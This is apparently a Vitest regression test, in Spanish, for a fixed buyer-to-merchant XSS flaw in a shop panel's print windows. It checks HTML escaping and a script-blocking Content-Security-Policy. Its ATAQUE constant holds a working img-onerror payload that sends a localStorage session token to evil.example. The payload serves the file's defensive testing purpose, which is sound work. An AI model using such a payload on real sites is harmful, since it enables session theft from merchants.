import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { CSP_DE_IMPRESION, conCspDeImpresion, escaparHtml, escribirParaImprimir } from "@/lib/impresionSegura";
import { cartelImprimible } from "@/lib/compartirTienda";

/**
 * XSS de comprador a comercio (2026-11-04): el nombre que un comprador escribe
 * en la tienda queda como cliente, y la ficha, el estado de cuenta y las deudas
 * lo metían sin escapar en una ventana de impresión con el origen del panel.
 * Un `<img onerror=…>` corría con la sesión del comercio.
 */
const ATAQUE = `<img src=x onerror="fetch('https://evil.example/?t='+localStorage.getItem('sb'))">`;

const archivos = (dir: string): string[] =>
  readdirSync(dir).flatMap(nombre => {
    const ruta = join(dir, nombre);
    return statSync(ruta).isDirectory() ? archivos(ruta) : /\.(ts|tsx)$/.test(nombre) ? [ruta] : [];
  });

describe("ventanas de impresión seguras", () => {
  it("el escape deja el ataque como texto", () => {
    const seguro = escaparHtml(ATAQUE);
    expect(seguro).not.toContain("<img");
    expect(seguro).toContain("&lt;img");
    expect(seguro).not.toMatch(/onerror="/);
  });

  it("toda ventana lleva una política que no deja correr ningún script", () => {
    expect(CSP_DE_IMPRESION).toContain("script-src 'none'");
    const conHead = conCspDeImpresion("<!doctype html><html><head><title>x</title></head><body></body></html>");
    expect(conHead.indexOf("Content-Security-Policy")).toBeLessThan(conHead.indexOf("<title>"));
    expect(conCspDeImpresion("<!doctype html><p>x</p>")).toMatch(/^<!doctype html><meta http-equiv="Content-Security-Policy"/);
    expect(conCspDeImpresion("<p>x</p>")).toMatch(/^<meta http-equiv="Content-Security-Policy"/);

    const escrito: string[] = [];
    const ventana = { document: { open: () => undefined, write: (h: string) => escrito.push(h), close: () => undefined } } as unknown as Window;
    escribirParaImprimir(ventana, "<html><head></head><body>hola</body></html>");
    expect(escrito.join("")).toContain("script-src 'none'");
  });

  it("nadie escribe en una ventana sin pasar por el helper", () => {
    const directos = archivos("src")
      .filter(f => !f.includes(join("src", "test")) && !f.endsWith("impresionSegura.ts"))
      .filter(f => /\.document\.write\(/.test(readFileSync(f, "utf8")));
    expect(directos, "usar escribirParaImprimir de @/lib/impresionSegura").toEqual([]);
  });

  it("ninguna plantilla de impresión trae su propio script (la política lo bloquearía)", () => {
    const html = cartelImprimible({ nombreTienda: "ZZ", url: "https://zz.nerqia.app", qr: "data:image/png;base64,AA" });
    expect(html).not.toMatch(/<script/i);
  });

  it("la ficha, el estado de cuenta y las deudas escapan lo que escribe el comprador", () => {
    const clientes = readFileSync("src/pages/CustomersPage.tsx", "utf8");
    const ficha = clientes.slice(clientes.indexOf("function exportCustomer360PDF("), clientes.indexOf("export default function CustomersPage()"));
    expect(ficha).not.toMatch(/\$\{c\.name\}/);
    expect(ficha).toContain("${escaparHtml(c.name)}");
    const deudas = readFileSync("src/pages/DebtsPage.tsx", "utf8");
    expect(deudas).toContain("${escaparHtml(d.customer_name || '—')}");
  });
});
